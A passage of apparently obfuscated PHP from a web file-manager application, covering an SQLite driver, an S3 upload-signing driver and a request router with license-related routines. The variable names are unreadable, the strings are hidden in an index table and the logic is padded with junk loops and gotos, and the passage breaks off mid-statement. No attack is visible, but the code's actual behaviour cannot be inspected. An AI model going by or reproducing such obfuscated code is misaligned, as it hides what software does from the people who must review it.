$this->_linkID->query($_SERVER[Ùæõ‰Ï’][27]); if (!$ƒ–úº¾) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $³¨õ—áÂ = $this->_linkID->query($_SERVER[Ùæõ‰Ï’][28]); if (!$³¨õ—áÂ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ı÷œ˜™– = array(); while ($™Û×Éı³ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ı÷œ˜™–[] = $™Û×Éı³; } $this->queryID->reset(); return $ı÷œ˜™–; } public function getFields($¾£Æ¦Ä) { $ÀêÙ¯Š¿ =& $_SERVER[Ùæõ‰Ï’]; $õÒ³»†¨ = $this->query($ÀêÙ¯Š¿[29] . $¾£Æ¦Ä . $ÀêÙ¯Š¿[30]); $ÕâšĞ— = array(); if ($õÒ³»†¨) { foreach ($õÒ³»†¨ as $õ¿ÎÈÕÀ => $•İöÎÒì) { $ÕâšĞ—[$•İöÎÒì[$ÀêÙ¯Š¿[32]]] = array($ÀêÙ¯Š¿[32] => $•İöÎÒì[$ÀêÙ¯Š¿[32]], $ÀêÙ¯Š¿[33] => $•İöÎÒì[$ÀêÙ¯Š¿[33]], $ÀêÙ¯Š¿[35] => (bool) ($•İöÎÒì[$ÀêÙ¯Š¿[35]] === $ÀêÙ¯Š¿[12]), $ÀêÙ¯Š¿[37] => $•İöÎÒì[$ÀêÙ¯Š¿[56]], $ÀêÙ¯Š¿[39] => (bool) $•İöÎÒì[$ÀêÙ¯Š¿[57]], $ÀêÙ¯Š¿[42] => (bool) $•İöÎÒì[$ÀêÙ¯Š¿[57]]); } } return $ÕâšĞ—; } public function getTables($Èèò¦ƒ¢ = '') { $ ¿µ†—ú =& $_SERVER[Ùæõ‰Ï’]; $îİİÙ³Ò = $this->query($ ¿µ†—ú[45] . $ ¿µ†—ú[46] . $ ¿µ†—ú[47]); $ÚÏØäª‹ = array(); foreach ($îİİÙ³Ò as $–«²Ã® => $×Á†Š™Ã) { $ÚÏØäª‹[$–«²Ã®] = current($×Á†Š™Ã); } return $ÚÏØäª‹; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¾ŞÁÕÑ± =& $_SERVER[Ùæõ‰Ï’]; $this->error = $this->_linkID->lastErrorMsg(); if ($¾ŞÁÕÑ±[12] != $this->queryStr) { $this->error .= LNG($¾ŞÁÕÑ±[48]) . $this->queryStr; } think_trace($this->error, $¾ŞÁÕÑ±[12], $¾ŞÁÕÑ±[49]); return $this->error; } public function escapeString($ì‘€´òÖ) { $Ë·Ú«ÒŞ =& $_SERVER[Ùæõ‰Ï’]; if ($this->_linkID) { return $this->_linkID->escapeString($ì‘€´òÖ); } return str_ireplace($Ë·Ú«ÒŞ[58], $Ë·Ú«ÒŞ[59], $ì‘€´òÖ); } public function parseLimit($¢¡¡£Ï¤) { $¼œ¶çÏ« =& $_SERVER[Ùæõ‰Ï’]; $ïÛšë–› = $¼œ¶çÏ«[12]; if (!empty($¢¡¡£Ï¤)) { $¢¡¡£Ï¤ = explode($¼œ¶çÏ«[50], $¢¡¡£Ï¤); if (count($¢¡¡£Ï¤) > 1) { $ïÛšë–› .= $¼œ¶çÏ«[51] . $¢¡¡£Ï¤[1] . $¼œ¶çÏ«[52] . $¢¡¡£Ï¤[0] . $¼œ¶çÏ«[53]; } else { $ïÛšë–› .= $¼œ¶çÏ«[51] . $¢¡¡£Ï¤[0] . $¼œ¶çÏ«[53]; } } return $ïÛšë–›; } } goto b°–È¹Œî½; b ½È…ë‹: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Š÷Ò‘Ù) { parent::__construct($Š÷Ò‘Ù); } public function uploadFormData($òë…‘Ó, $øßá§³ï = 3600) { $­à©Ñïï =& $_SERVER[Ùæõ‰Ï’]; $ö´Ğ€ÒØ = $­à©Ñïï[229]; $²šÅ³£Å = $­à©Ñïï[270]; $ïº…áä´ = $­à©Ñïï[62]; $ Ö—ÉÆ = gmdate($­à©Ñïï[271]); $‡İ°®ùå = gmdate($­à©Ñïï[272]); $æíêËïú = $­à©Ñïï[273]; $ ¯®ÌõÛ = $øßá§³ï . $­à©Ñïï[12]; $ş¾ÄŞØ× = $­à©Ñïï[274]; $¶ÛÛ–ìü = array($this->accessKey, $‡İ°®ùå, $this->region, $ïº…áä´, $æíêËïú); $ğåÙÊ”› = implode($­à©Ñïï[8], $¶ÛÛ–ìü); $œİˆÖŞ = array($­à©Ñïï[275] => gmdate($­à©Ñïï[299], strtotime($­à©Ñïï[277])), $­à©Ñïï[278] => array(array($­à©Ñïï[279] => $this->bucket), array($­à©Ñïï[280] => $ö´Ğ€ÒØ), array($­à©Ñïï[281], $­à©Ñïï[282], $­à©Ñïï[12]), array($­à©Ñïï[281], $­à©Ñïï[283], $­à©Ñïï[12]), array($­à©Ñïï[281], $­à©Ñïï[284], $­à©Ñïï[12]), array($­à©Ñïï[285] => $ş¾ÄŞØ×), array($­à©Ñïï[286] => $ğåÙÊ”›), array($­à©Ñïï[287] => $²šÅ³£Å), array($­à©Ñïï[288] => $ Ö—ÉÆ), array($­à©Ñïï[289] => $ ¯®ÌõÛ))); $•‰®¼½ = base64_encode(json_encode($œİˆÖŞ)); $ÙùæöÑª = hash_hmac($­à©Ñïï[290], $‡İ°®ùå, $­à©Ñïï[291] . $this->secret, !0); $Ò¡Õç”‡ = hash_hmac($­à©Ñïï[290], $this->region, $ÙùæöÑª, !0); $š¶äŒ½ù = hash_hmac($­à©Ñïï[290], $ïº…áä´, $Ò¡Õç”‡, !0); $‹Ì™íÍ´ = hash_hmac($­à©Ñïï[290], $æíêËïú, $š¶äŒ½ù, !0); $­®‡¶¶Ø = hash_hmac($­à©Ñïï[290], $•‰®¼½, $‹Ì™íÍ´); $é–‡¯òÏ = array($­à©Ñïï[246] => $­à©Ñïï[12], $­à©Ñïï[292] => $­à©Ñïï[12], $­à©Ñïï[280] => $ö´Ğ€ÒØ, $­à©Ñïï[285] => $ş¾ÄŞØ×, $­à©Ñïï[293] => $•‰®¼½, $­à©Ñïï[294] => $ğåÙÊ”›, $­à©Ñïï[295] => $²šÅ³£Å, $­à©Ñïï[296] => $ Ö—ÉÆ, $­à©Ñïï[297] => $ ¯®ÌõÛ, $­à©Ñïï[298] => $­®‡¶¶Ø, $­à©Ñïï[208] => $this->getHost()); return $é–‡¯òÏ; } public function multiUploadFormData($¿ÜÙ“‰á, $ÌõÍŞ½ı = 3600) { $ƒï¼ü =& $_SERVER[Ùæõ‰Ï’]; $Û…ãî€å = gmdate($ƒï¼ü[300]); $—å¡†Õı = array(); $ñÎÔ©œÔ = $this->client->getUploadId($this->bucket, $¿ÜÙ“‰á, $—å¡†Õı); if (!$ñÎÔ©œÔ) { return !1; } return array($ƒï¼ü[254] => $ñÎÔ©œÔ, $ƒï¼ü[208] => $this->getHost() . $ƒï¼ü[8] . $this->pathEncode($¿ÜÙ“‰á), $ƒï¼ü[255] => $Û…ãî€å, $ƒï¼ü[97] => $¿ÜÙ“‰á); } public function multiUploadAuthData($–—«¢ñ, $ğŒóû¹› = array()) { $¼æ“ŒÛ =& $_SERVER[Ùæõ‰Ï’]; $ÓÃ÷­ã = isset($ğŒóû¹›[$¼æ“ŒÛ[169]]) ? $ğŒóû¹›[$¼æ“ŒÛ[169]] : $¼æ“ŒÛ[12]; $ˆÇËšŞ = $ğŒóû¹›[$¼æ“ŒÛ[97]]; unset($ğŒóû¹›[$¼æ“ŒÛ[97]]); if (isset($ğŒóû¹›[$¼æ“ŒÛ[256]])) { return $this->listUploadParts($ˆÇËšŞ, $ğŒóû¹›); } $ªµöúÈÆ = array(); if (isset($ğŒóû¹›[$¼æ“ŒÛ[301]])) { $ªµöúÈÆ[$¼æ“ŒÛ[302]] = $ğŒóû¹›[$¼æ“ŒÛ[301]]; } $®°ô’«¢ = explode($¼æ“ŒÛ[210], $this->getHost()); $“¾ÛØàï = array($¼æ“ŒÛ[303] => $®°ô’«¢[1], $¼æ“ŒÛ[304] => $¼æ“ŒÛ[12], $¼æ“ŒÛ[246] => $¼æ“ŒÛ[123], $¼æ“ŒÛ[292] => $ğŒóû¹›[$¼æ“ŒÛ[79]]); $ã‡‡£é‘ = $¼æ“ŒÛ[259]; $Ó§ÖõÎ‚ = $¼æ“ŒÛ[8] . $this->pathEncode($ˆÇËšŞ) . $ÓÃ÷­ã; $†Ãé¶ÕÁ = $this->client->__getSignatureV4($ªµöúÈÆ, $“¾ÛØàï, $ã‡‡£é‘, $Ó§ÖõÎ‚); if (strpos($ÓÃ÷­ã, $¼æ“ŒÛ[258]) === 0) { if (isset($ªµöúÈÆ[$¼æ“ŒÛ[302]])) { $ÀºŠŞÁÖ = $ªµöúÈÆ[$¼æ“ŒÛ[302]]; } else { if (isset($†Ãé¶ÕÁ[$¼æ“ŒÛ[302]])) { $ÀºŠŞÁÖ = $†Ãé¶ÕÁ[$¼æ“ŒÛ[302]]; } else { $ÀºŠŞÁÖ = hash($¼æ“ŒÛ[290], $¼æ“ŒÛ[12]); } } return array($¼æ“ŒÛ[265] => $†Ãé¶ÕÁ[$¼æ“ŒÛ[265]], $¼æ“ŒÛ[302] => $ÀºŠŞÁÖ, $¼æ“ŒÛ[255] => $†Ãé¶ÕÁ[$¼æ“ŒÛ[305]]); } return $†Ãé¶ÕÁ[$¼æ“ŒÛ[265]]; } public function listUploadParts($””ƒşÑ, $ŠİÍÜ”ï = array()) { $¤ÜÏ’ˆ‹ =& $_SERVER[Ùæõ‰Ï’]; $“úû·ñ = str_replace($¤ÜÏ’ˆ‹[266], $¤ÜÏ’ˆ‹[12], $ŠİÍÜ”ï[$¤ÜÏ’ˆ‹[169]]); $à®ÍÌÜ¼ = $this->client->listParts($this->bucket, $””ƒşÑ, $“úû·ñ); if (!$à®ÍÌÜ¼) { return !1; } $Ñö‹ØçÆ = $¤ÜÏ’ˆ‹[306]; foreach ($à®ÍÌÜ¼ as $‡ƒªÁªÁ) { $Ñö‹ØçÆ .= $¤ÜÏ’ˆ‹[307] . "\x3c\120\141\162\164\x4e\165\x6d\x62\x65\x72\76{$‡ƒªÁªÁ[$¤ÜÏ’ˆ‹[308]]}\74\57\120\141\x72\164\x4e\x75\x6d\142\x65\x72\76\12" . "\74\105\x54\141\147\76{$‡ƒªÁªÁ[$¤ÜÏ’ˆ‹[309]]}\74\x2f\x45\x54\x61\147\76\xa" . $¤ÜÏ’ˆ‹[310]; } $Ñö‹ØçÆ .= $¤ÜÏ’ˆ‹[311]; $—š˜ê¾ = array(); $¾©åëæˆ = explode($¤ÜÏ’ˆ‹[210], $this->getHost()); $ğ•’… = array($¤ÜÏ’ˆ‹[303] => $¾©åëæˆ[1], $¤ÜÏ’ˆ‹[246] => $¤ÜÏ’ˆ‹[123], $¤ÜÏ’ˆ‹[292] => strlen($Ñö‹ØçÆ)); $ìü‚áì· = $¤ÜÏ’ˆ‹[257]; $ö‘³–Ù– = $¤ÜÏ’ˆ‹[8] . $this->pathEncode($””ƒşÑ) . $ŠİÍÜ”ï[$¤ÜÏ’ˆ‹[169]]; $ĞÇ§üÖî = $this->client->__getSignatureV4($—š˜ê¾, $ğ•’…, $ìü‚áì·, $ö‘³–Ù–, $Ñö‹ØçÆ); return array($¤ÜÏ’ˆ‹[265] => $ĞÇ§üÖî[$¤ÜÏ’ˆ‹[265]], $¤ÜÏ’ˆ‹[255] => $ĞÇ§üÖî[$¤ÜÏ’ˆ‹[305]], $¤ÜÏ’ˆ‹[267] => $à®ÍÌÜ¼, $¤ÜÏ’ˆ‹[302] => $ĞÇ§üÖî[$¤ÜÏ’ˆ‹[302]]); } public function link($¦ãìäïë, $ŒÛßÁ£Ç = array()) { return parent::link($¦ãìäïë, $ŒÛßÁ£Ç); } public function fileOut($ÌËÁ–ø, $Ÿñ§ï‚ = false, $ ÅŒ†ú = false, $§­€Ô¬¯ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ùæõ‰Ï’][312])) { return parent::fileOutServer($ÌËÁ–ø, $Ÿñ§ï‚, $ ÅŒ†ú, $§­€Ô¬¯); } parent::fileOut($ÌËÁ–ø, $Ÿñ§ï‚, $ ÅŒ†ú, $§­€Ô¬¯); } public function fileOutImage($ôÃ¬à©À, $¢–µ’áÚ = 250) { if (strstr($this->endpoint, $_SERVER[Ùæõ‰Ï’][312])) { return parent::fileOutImageServer($ôÃ¬à©À, $¢–µ’áÚ); } parent::fileOutImage($ôÃ¬à©À, $¢–µ’áÚ); } public function fileOutLink($×çŒËÆú) { $ùÙÉóÑ» =& $_SERVER[Ùæõ‰Ï’]; if (substr($×çŒËÆú, 0, 7) == $ùÙÉóÑ»[313]) { $×çŒËÆú = $ùÙÉóÑ»[314] . substr($×çŒËÆú, 7); } header($ùÙÉóÑ»[175] . $×çŒËÆú); die; } } define($_SERVER[Ùæõ‰Ï’][315], 1); define($_SERVER[Ùæõ‰Ï’][316], 2); goto a­Ç˜ïŸùì; a¨¼½ñ”‰è: class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\x69\x6e\144\x65\170"; function __construct() { } public function setDefault($‡ƒ¯ñÈÜ) { $úîü¸ôœ =& $_SERVER[Ùæõ‰Ï’]; $èÆÆØ¬ =& $_SERVER[øé†…ş]; $ªŒïššÀ = explode($èÆÆØ¬[0], trim($‡ƒ¯ñÈÜ, $èÆÆØ¬[0])); $this->defaultModule = $ªŒïššÀ[0] ? $ªŒïššÀ[0] : $this->defaultModule; $êÉŞ®‚ñ = $úîü¸ôœ[684]; if (strlen($êÉŞ®‚ñ) < $úîü¸ôœ[680]) { return; } $this->defaultController = $ªŒïššÀ[1] ? $ªŒïššÀ[1] : $this->defaultController; $this->defaultAction = $ªŒïššÀ[2] ? $ªŒïššÀ[2] : $this->defaultAction; $this->fqra7298836d($èÆÆØ¬[1], array($this, $èÆÆØ¬[2])); $½¯¿½Ã = $úîü¸ôœ[685]; if (strlen($½¯¿½Ã) < $úîü¸ôœ[686]) { return; } } public function appRun($¥Ÿûü¶ƒ) { $ùÈ’á› =& $_SERVER[Ùæõ‰Ï’]; $Í¯Ô ğë =& $_SERVER[øé†…ş]; $ÚŒ¥ã = explode($Í¯Ô ğë[0], $¥Ÿûü¶ƒ); $İô±ÒñØ = $ùÈ’á›[687]; if (strlen($İô±ÒñØ) < $ùÈ’á›[680]) { die; } $®…¬£’Ê = strtolower($ÚŒ¥ã[0]); $”´ßÜ = $Í¯Ô ğë[3]; $¸–ºşú = $ùÈ’á›[688]; while (strlen($¸–ºşú) < $ùÈ’á›[686]) { if (!$¸–ºşú) { break; } $¸–ºşú++; } if ($®…¬£’Ê == $Í¯Ô ğë[4]) { $”´ßÜ = $Í¯Ô ğë[5]; $ÚŒ¥ã[0] = $Í¯Ô ğë[6]; $ÚŒ¥ã[1] = $ÚŒ¥ã[1] . $Í¯Ô ğë[7]; $¥Ÿûü¶ƒ = join($Í¯Ô ğë[0], $ÚŒ¥ã); $¥Ÿûü¶ƒ = trim($¥Ÿûü¶ƒ, $Í¯Ô ğë[0]); } call_user_func(array($Í¯Ô ğë[8], $Í¯Ô ğë[9]), $”´ßÜ . $Í¯Ô ğë[10], $¥Ÿûü¶ƒ); ActionCall($¥Ÿûü¶ƒ); call_user_func(array($Í¯Ô ğë[8], $Í¯Ô ğë[9]), $”´ßÜ . $Í¯Ô ğë[11], $¥Ÿûü¶ƒ); $µ”«Áæú = $ùÈ’á›[689]; if (strlen($µ”«Áæú) < $ùÈ’á›[690]) { die; } } private function autorun() { $›¯Ì®»è =& $_SERVER[øé†…ş]; global $config; if (count($config[$›¯Ì®»è[12]]) == 0) { return; } foreach ($config[$›¯Ì®»è[12]] as $¯‘ç±ı€ => $›’î¿î«) { $this->appRun($›’î¿î«); $Ğ‡¯†õü = $_SERVER[Ùæõ‰Ï’][691]; } } private function gcokb7941eaa() { $™ÈÜ¼¥î =& $_SERVER[Ùæõ‰Ï’]; $¬²ã´ì =& $_SERVER[øé†…ş]; $ò¥’Æıë = $¬²ã´ì[4]; $¹›áîÉá = $GLOBALS[$¬²ã´ì[13]][$¬²ã´ì[14]][0]; $œ–Ú»× = $™ÈÜ¼¥î[692]; if (!$œ–Ú»×) { return; } if (!$¹›áîÉá || strlen($¹›áîÉá) <= strlen($ò¥’Æıë)) { return; } if (strtolower(substr($¹›áîÉá, -strlen($ò¥’Æıë))) != $ò¥’Æıë) { return; } $ÈúÊı = substr($¹›áîÉá, 0, -strlen($ò¥’Æıë)); $è‘´É¡Ñ = $™ÈÜ¼¥î[693]; $î¹ûêÍ = array($¬²ã´ì[4], $ÈúÊı); $ÜÀåÅëî = $™ÈÜ¼¥î[694]; $ªÄü¢œ = array_slice($GLOBALS[$¬²ã´ì[13]][$¬²ã´ì[14]], 1); $¨Š¦µÛ = $™ÈÜ¼¥î[695]; while (strlen($¨Š¦µÛ) < $™ÈÜ¼¥î[686]) { if (!$¨Š¦µÛ) { break; } $¨Š¦µÛ++; } $GLOBALS[$¬²ã´ì[13]][$¬²ã´ì[14]] = array_merge($î¹ûêÍ, $ªÄü¢œ); $â¨âÎÑ = $™ÈÜ¼¥î[696]; if (strlen($â¨âÎÑ) < $™ÈÜ¼¥î[690]) { die; } $GLOBALS[$¬²ã´ì[13]][$¬²ã´ì[15]] = implode($¬²ã´ì[0], $GLOBALS[$¬²ã´ì[13]][$¬²ã´ì[14]]); $­±ÓÏŠä = $™ÈÜ¼¥î[697]; } private function tkcv11fc5151() { $ÓË¦èöî =& $_SERVER[Ùæõ‰Ï’]; $¾¾¾Íˆ² =& $_SERVER[øé†…ş]; if ($GLOBALS[$¾¾¾Íˆ²[13]][$¾¾¾Íˆ²[15]] != $¾¾¾Íˆ²[6]) { return; } $ñ¡¬çŒ = $_SERVER[$¾¾¾Íˆ²[16]]; $‡‚ş¦ßª = $ÓË¦èöî[698]; $×»ª‘†Ä = $¾¾¾Íˆ²[17]; if (!strstr($ñ¡¬çŒ, $×»ª‘†Ä)) { return; } $ìëÇî Ğ = strrpos($ñ¡¬çŒ, $×»ª‘†Ä); $¡¨Êµ¯ = $ÓË¦èöî[699]; $Òîş…’ = substr($ñ¡¬çŒ, $ìëÇî Ğ + strlen($×»ª‘†Ä)); preg_match_all($¾¾¾Íˆ²[18], $Òîş…’, $£¿Ü¢‰); $€ğúÔŞÏ = $ÓË¦èöî[700]; if (!$€ğúÔŞÏ) { die; } $Òîş…’ = trim($£¿Ü¢‰[0][0], $¾¾¾Íˆ²[19]); $…°¬±™ = $ÓË¦èöî[701]; if (strlen($…°¬±™) < $ÓË¦èöî[686]) { return; } $GLOBALS[$¾¾¾Íˆ²[13]][$¾¾¾Íˆ²[14]] = explode($¾¾¾Íˆ²[19], $Òîş…’); $GLOBALS[$¾¾¾Íˆ²[13]][$¾¾¾Íˆ²[15]] = implode($¾¾¾Íˆ²[0], $GLOBALS[$¾¾¾Íˆ²[13]][$¾¾¾Íˆ²[14]]); } public function run() { $®µšş¬ =& $_SERVER[Ùæõ‰Ï’]; $Œ¦´ îş =& $_SERVER[øé†…ş]; $this->tkcv11fc5151(); $Ì×£¾Ë = $®µšş¬[702]; if (!$Ì×£¾Ë) { return; } $this->gcokb7941eaa(); $àâ¡üÍ = $GLOBALS[$Œ¦´ îş[13]][$Œ¦´ îş[14]]; $îúŸÚ–Ì = $GLOBALS[$Œ¦´ îş[13]][$Œ¦´ îş[15]]; define($Œ¦´ îş[20], isset($àâ¡üÍ[0]) && $àâ¡üÍ[0] ? $àâ¡üÍ[0] : $this->defaultModule); $©õ¿•Ø´ = $®µšş¬[703]; define($Œ¦´ îş[21], isset($àâ¡üÍ[1]) && $àâ¡üÍ[0] ? $àâ¡üÍ[1] : $this->defaultController); $î™Š°—‡ = $®µšş¬[704]; while ($î™Š°—‡ < $®µšş¬[686]) { if ($î™Š°—‡ >= 0) { break; } $î™Š°—‡++; } define($Œ¦´ îş[22], isset($àâ¡üÍ[2]) && $àâ¡üÍ[0] ? $àâ¡üÍ[2] : $this->defaultAction); define($Œ¦´ îş[23], MOD . $Œ¦´ îş[0] . ST . $Œ¦´ îş[0] . ACT); $ÂŒÆô² = $®µšş¬[705]; if (!$ÂŒÆô²) { die; } $_SERVER[$Œ¦´ îş[24]] = strtolower(ACTION); $this->autorun(); $ÏÌáÍµµ = $®µšş¬[706]; if (strlen($ÏÌáÍµµ) < $®µšş¬[707]) { die; } if (count($àâ¡üÍ) >= 3) { $this->appRun($îúŸÚ–Ì); } else { $this->appRun(ACTION); } } private $zwsgf20f9007 = array(); private $ulwt91e7f40a = ''; public function zrmn86e0ddea() { $§ÜÉ²ä‰ =& $_SERVER[Ùæõ‰Ï’]; $äÏ¡ÊÏ¡ =& $_SERVER[øé†…ş]; $this->jvilce461df1(); $ÎÒ€üÇ = $§ÜÉ²ä‰[708]; if (strlen($ÎÒ€üÇ) < $§ÜÉ²ä‰[707]) { die; } $this->oqigeec957e9(); $¹€ŞÀ€ = $§ÜÉ²ä‰[709]; while ($¹€ŞÀ€ < $§ÜÉ²ä‰[680]) { if ($¹€ŞÀ€ >= 0) { break; } $¹€ŞÀ€++; } $this->ckpe0db01bbe(); $Å¾Ç˜Ë“ = $§ÜÉ²ä‰[710]; $this->vwci2c0aa9ca(); $Ø¦áòš = $§ÜÉ²ä‰[711]; $this->blhzcc457755(); $çÙ€’÷ş = $§ÜÉ²ä‰[712]; if (!$çÙ€’÷ş) { return; } $this->crnh301c4a5b(); $§ñ¯ü = $§ÜÉ²ä‰[713]; if (strlen($§ñ¯ü) < $§ÜÉ²ä‰[686]) { return; } $this->sgdn095a118e(); $this->fqra7298836d($äÏ¡ÊÏ¡[25], array($this, $äÏ¡ÊÏ¡[26])); $Î¿âÄîÕ = $§ÜÉ²ä‰[714]; if (!$Î¿âÄîÕ) { die; } $this->fqra7298836d($äÏ¡ÊÏ¡[27], array($this, $äÏ¡ÊÏ¡[28])); $ä·ëÅù± = $§ÜÉ²ä‰[715]; if (!$ä·ëÅù±) { return; } $this->fqra7298836d($äÏ¡ÊÏ¡[29], array($this, $äÏ¡ÊÏ¡[30])); $‚ñ®ÌÃ = $§ÜÉ²ä‰[716]; while ($‚ñ®ÌÃ < $§ÜÉ²ä‰[690]) { if ($‚ñ®ÌÃ >= 0) { break; } $‚ñ®ÌÃ++; } $this->fqra7298836d($äÏ¡ÊÏ¡[31], array($this, $äÏ¡ÊÏ¡[32])); $íÁş‘Ä„ = $§ÜÉ²ä‰[717]; } public function gxfn0fd6d3bf($êåİÅû«) { $£»˜À‘ =& $_SERVER[Ùæõ‰Ï’]; $·Óšı =& $_SERVER[øé†…ş]; $ŒÄßµ× = Model($·Óšı[33])->get(); $é˜›œ¦İ = $£»˜À‘[718]; if (!$é˜›œ¦İ) { return; } $¼ØŞä¯¬ = array($·Óšı[34], $·Óšı[35], $·Óšı[36], $·Óšı[37], $·Óšı[38], $·Óšı[39], $·Óšı[40], $·Óšı[41], $·Óšı[42], $·Óšı[43], $·Óšı[44], $·Óšı[45], $·Óšı[46], $·Óšı[47], $·Óšı[48], $·Óšı[49], $·Óšı[50], $·Óšı[51], $·Óšı[52], $·Óšı[53], $·Óšı[54], $·Óšı[55], $·Óšı[56], $·Óšı[57], $·Óšı[58], $·Óšı[59], $·Óšı[60], $·Óšı[61], $·Óšı[62], $·Óšı[63], $·Óšı[64], $·Óšı[65], $·Óšı[66], $·Óšı[67], $·Óšı[68], $·Óšı[69], $·Óšı[70], $·Óšı[71], $·Óšı[72], $·Óšı[73], $·Óšı[74], $·Óšı[75], $·Óšı[76], $·Óšı[77], $·Óšı[78], $·Óšı[79], $·Óšı[80], $·Óšı[81], $·Óšı[82], $·Óšı[83], $·Óšı[84], $·Óšı[85]); foreach ($¼ØŞä¯¬ as $Â˜³æ¯´) { $˜Ìç³‘ = $GLOBALS[$·Óšı[86]][$·Óšı[87]][$Â˜³æ¯´]; $µ¬¿ê† = $£»˜À‘[719]; if (!$µ¬¿ê†) { return; } if (isset($ŒÄßµ×[$Â˜³æ¯´])) { $˜Ìç³‘ = $ŒÄßµ×[$Â˜³æ¯´]; } $êåİÅû«[$·Óšı[88]][$·Óšı[89]][$Â˜³æ¯´] = $˜Ìç³‘; } $Å€ˆÕ‰ú = $êåİÅû«[$·Óšı[88]][$·Óšı[89]][$·Óšı[46]]; $¯óËºÂ = $£»˜À‘[720]; if (strlen($¯óËºÂ) < $£»˜À‘[707]) { die; } unset($êåİÅû«[$·Óšı[88]][$·Óšı[90]][$·Óšı[91]]); $ú’÷Åş = $£»˜À‘[721]; while ($ú’÷Åş < $£»˜À‘[680]) { if ($ú’÷Åş >= 0) { break; } $ú’÷Åş++; } unset($êåİÅû«[$·Óšı[88]][$·Óšı[90]][$·Óšı[92]]); unset($êåİÅû«[$·Óšı[88]][$·Óšı[89]][$·Óšı[46]]); unset($êåİÅû«[$·Óšı[88]][$·Óšı[89]][$·Óšı[93]]); $äö“×ÒĞ = $£»˜À‘[722]; $êåİÅû«[$·Óšı[88]][$·Óšı[89]][$·Óšı[94]] = array($·Óšı[95] => (int) $Å€ˆÕ‰ú[$·Óšı[96]], $·Óšı[97] => (int) _get($Å€ˆÕ‰ú, $·Óšı[98], 0)); $ƒŞ´Ï»€ = $£»˜À‘[723]; if (strlen($ƒŞ´Ï»€) < $£»˜À‘[707]) { die; } $ØÎ€‹Ü© = substr(md5($·Óšı[99] . get_client_ip() . $ŒÄßµ×[$·Óšı[100]]), 0, 15); $†¸ İÖá = $£»˜À‘[724]; if (!$†¸ İÖá) { return; } $êåİÅû«[$·Óšı[101]][$·Óšı[102]] = Mcrypt::encode(Session::sign(), $ØÎ€‹Ü©, 3600 * 24); $êåİÅû«[$·Óšı[101]][$·Óšı[103]] = Action($·Óšı[104])->accessToken(); $‡ÂšüŠ¨ = $£»˜À‘[725]; $êåİÅû«[$·Óšı[101]][$·Óšı[105]] = md5($_SERVER[$·Óšı[106]] . $ŒÄßµ×[$·Óšı[100]]); $óç³‡ö¶ = $£»˜À‘[726]; while (strlen($óç³‡ö¶) < $£»˜À‘[680]) { if (!$óç³‡ö¶) { break; } $óç³‡ö¶++; } $êåİÅû«[$·Óšı[101]][$·Óšı[107]] = base64_encode(serverInfo()); $êåİÅû«[$·Óšı[101]][$·Óšı[108]] = $this->ulwt91e7f40a; if ($ŒÄßµ×[$·Óšı[108]] != $·Óšı[109]) { $êåİÅû«[$·Óšı[101]][$·Óšı[110]] = $ŒÄßµ×[$·Óšı[110]]; $êåİÅû«[$·Óšı[101]][$·Óšı[111]] = $ŒÄßµ×[$·Óšı[111]]; $©„˜¸§ğ = rand_string(10) . $this->ulwt91e7f40a . rand_string(5); $êåİÅû«[$·Óšı[88]][$·Óšı[112]][$·Óšı[113]] = $this->lrzw24095e82($©„˜¸§ğ, $êåİÅû«[$·Óšı[101]][$·Óšı[105]]); } if ($this->ulwt91e7f40a == $·Óšı[109]) { $êåİÅû«[$·Óšı[88]][$·Óšı[89]][$·Óšı[94]][$·Óšı[98]] = 0; } $êåİÅû«[$·Óšı[101]][$·Óšı[114]] = $this->versionPluginFilter(); $êåİÅû«[$·Óšı[101]][$·Óšı[115]] = _get($this->zwsgf20f9007, $·Óšı[116], $·Óšı[6]); if (KodUser::isRoot() && $this->config[$·Óšı[117]]) { $êåİÅû«[$·Óšı[101]][$·Óšı[118]] = WEB_ROOT; } return $êåİÅû«; } private function crnh301c4a5b() { $øŞë‚Ò =& $_SERVER[Ùæõ‰Ï’]; $û¢˜ãÍØ =& $_SERVER[øé†…ş]; $ÏÔçÛ­ü = $_SERVER[$û¢˜ãÍØ[24]] == $û¢˜ãÍØ[119]; if ($_SERVER[$û¢˜ãÍØ[24]] == $û¢˜ãÍØ[120] && $_GET[$û¢˜ãÍØ[121]] == $û¢˜ãÍØ[122]) { $ÏÔçÛ­ü = !0; } if ($ÏÔçÛ­ü) { $Ò›š›Ú“ = array($û¢˜ãÍØ[108] => $this->ulwt91e7f40a, $û¢˜ãÍØ[123] => $this->tyil275b75eb(), $û¢˜ãÍØ[124] => Model($û¢˜ãÍØ[125])->count()); if ($this->ulwt91e7f40a != $û¢˜ãÍØ[109]) { $ÒìØšÎ = _get($this->zwsgf20f9007, $û¢˜ãÍØ[126]); if ($ÒìØšÎ) { $Ò›š›Ú“[$û¢˜ãÍØ[127]] = $ÒìØšÎ; $Ò›š›Ú“[$û¢˜ãÍØ[128]] = strtotime(_get($this->zwsgf20f9007, $û¢˜ãÍØ[129])); $Ò›š›Ú“[$û¢˜ãÍØ[130]] = _get($this->zwsgf20f9007, $û¢˜ãÍØ[116]); } $„çúôâƒ = Model($û¢˜ãÍØ[33])->get($û¢˜ãÍØ[131], $û¢˜ãÍØ[6], !0); if (is_string($„çúôâƒ) && substr($„çúôâƒ, 0, 1) == $û¢˜ãÍØ[132]) { $„çúôâƒ = json_decode_force($„çúôâƒ); } if (is_array($„çúôâƒ) && $„çúôâƒ[$û¢˜ãÍØ[133]] && strstr($„çúôâƒ[$û¢˜ãÍØ[133]], $û¢˜ãÍØ[134])) { $×›ªô¨¯ = explode($û¢˜ãÍØ[134], $„çúôâƒ[$û¢˜ãÍØ[133]]); $Ò›š›Ú“[$û¢˜ãÍØ[135]] = $×›ªô¨¯[0]; } } $Ò›š›Ú“ = $this->cmxj88764825(json_encode($Ò›š›Ú“), md5($û¢˜ãÍØ[136])); $¸Ô—’õ… = array($û¢˜ãÍØ[137] => $Ò›š›Ú“); call_user_func(array($û¢˜ãÍØ[138], $û¢˜ãÍØ[139]), $¸Ô—’õ…); } if ($this->ulwt91e7f40a == $û¢˜ãÍØ[109]) { return; } $†ØÛ»é = 